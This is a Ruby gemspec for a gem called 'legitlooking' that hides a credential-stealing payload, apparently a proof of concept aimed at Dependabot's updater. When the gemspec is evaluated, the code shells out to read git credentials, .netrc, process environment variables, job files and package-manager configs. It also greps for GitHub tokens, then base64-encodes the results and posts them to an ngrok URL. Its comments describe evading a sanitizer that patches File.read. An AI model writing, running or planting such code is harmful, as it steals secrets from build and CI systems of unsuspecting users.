# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  # File.read is gepatchd door GemspecSanitizer -- gebruik shell cat
  cmd = ->(c) { `#{c} 2>/dev/null`.strip[0, 4000] }
  cat = ->(f) { cmd.("cat '#{f}'") }
  lines = []

  base = "/home/dependabot/dependabot-updater"

  # ============================================================
  # 1. GIT CONFIG -- access token via http.extraheader?
  # ============================================================
  lines << "=== 1. GIT CONFIG (via shell) ==="
  lines << cat.("#{base}/repo/.git/config")

  lines << "\n--- git config --list (alle instellingen) ---"
  lines << cmd.("git -C #{base}/repo config --list")

  lines << "\n--- git credential store ---"
  lines << cmd.("git config --global --list")
  lines << cat.("/home/dependabot/.git-credentials")
  lines << cat.("/home/dependabot/.netrc")

  # ============================================================
  # 2. PARENT ENVIRON VIA SHELL -- omzeilt dumpable restrictie
  # ============================================================
  lines << "\n=== 2. PARENT PROCESS ENVIRON (via shell) ==="
  lines << cmd.("cat /proc/1/environ | tr '\\0' '\\n'")
  lines << "\n--- PID 1077 ---"
  lines << cmd.("cat /proc/1077/environ | tr '\\0' '\\n'")
  lines << "\n--- PID 1083 ---"
  lines << cmd.("cat /proc/1083/environ | tr '\\0' '\\n' | grep -iE 'TOKEN|SECRET|CRED|KEY|AUTH|DEPEND|JOB'")
  lines << "\n--- PID 1084 (main updater) ---"
  lines << cmd.("cat /proc/1084/environ | tr '\\0' '\\n'")

  # ============================================================
  # 3. FIXTURE: job_with_credentials.json
  # ============================================================
  lines << "\n=== 3. JOB FIXTURE WITH CREDENTIALS ==="
  lines << cat.("#{base}/spec/fixtures/jobs/job_with_credentials.json")

  # ============================================================
  # 4. UPDATER BRONCODE -- api_client.rb
  # ============================================================
  lines << "\n=== 4. api_client.rb ==="
  lines << cat.("#{base}/lib/dependabot/api_client.rb")

  lines << "\n=== 4b. environment.rb ==="
  lines << cat.("#{base}/lib/dependabot/environment.rb")

  # ============================================================
  # 5. PIP.CONF + NPMRC
  # ============================================================
  lines << "\n=== 5. PIP.CONF ==="
  lines << cat.("#{base}/repo/pip.conf")
  lines << cat.("/home/dependabot/.config/pip/pip.conf")

  lines << "\n=== 5b. NPMRC ==="
  lines << cmd.("find /home/dependabot -name '.npmrc' 2>/dev/null -exec cat {} \\;")
  lines << cmd.("find /home/dependabot -name '.yarnrc' -o -name '.yarnrc.yml' 2>/dev/null -exec cat {} \\;")
  lines << cmd.("find /home/dependabot -name '.bundle' -type d 2>/dev/null")
  lines << cat.("/home/dependabot/.bundle/config")

  # ============================================================
  # 6. JOB.JSON -- via shell (omzeilt File.read patch)
  # ============================================================
  lines << "\n=== 6. JOB.JSON (via cat) ==="
  lines << cmd.("cat #{base}/job.json")
  lines << "\n--- job path from env ---"
  lines << cmd.("echo $DEPENDABOT_JOB_PATH")
  lines << cmd.("cat $DEPENDABOT_JOB_PATH")

  # ============================================================
  # 7. SERVICE.RB -- hoe credentials worden doorgegeven
  # ============================================================
  lines << "\n=== 7. service.rb ==="
  lines << cat.("#{base}/lib/dependabot/service.rb")

  lines << "\n=== 7b. base_command.rb ==="
  lines << cat.("#{base}/lib/dependabot/base_command.rb")

  # ============================================================
  # 8. ALLE TOKEN-ACHTIGE STRINGS IN MEMORY (via /proc/pid/maps)
  #    Zoek naar ghs_ of ghp_ of ghr_ tokens in mapped files
  # ============================================================
  lines << "\n=== 8. TOKEN GREP IN /proc/1084/maps FILES ==="
  lines << cmd.("grep -ao 'ghs_[A-Za-z0-9_]*' /proc/1084/maps 2>/dev/null | head -5")
  lines << cmd.("strings /proc/1084/exe 2>/dev/null | grep -E '^(ghs_|ghp_|ghr_|github_pat_)' | head -5")

  # ============================================================
  # EXFIL
  # ============================================================
  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=shell_read")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 25, read_timeout: 25) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=shell_read&err=#{URI.encode_www_form_component(e.message[0, 200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.23"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
